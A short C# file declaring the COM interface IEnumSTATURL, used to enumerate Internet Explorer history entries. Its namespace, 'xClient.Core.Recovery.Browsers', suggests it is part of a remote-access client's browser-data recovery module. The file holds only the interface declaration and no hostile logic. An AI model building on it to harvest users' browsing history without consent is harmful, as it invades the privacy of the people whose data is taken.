using System.Runtime.InteropServices;

namespace xClient.Core.Recovery.Browsers;

[ComImport]
[Guid("3C374A42-BAE4-11CF-BF7D-00AA006946EE")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
public interface IEnumSTATURL
{
	void Next(int celt, ref STATURL rgelt, out int pceltFetched);

	void Skip(int celt);

	void Reset();

	void Clone(out IEnumSTATURL ppenum);

	void SetFilter([MarshalAs(UnmanagedType.LPWStr)] string poszFilter, STATURLFLAGS dwFlags);
}
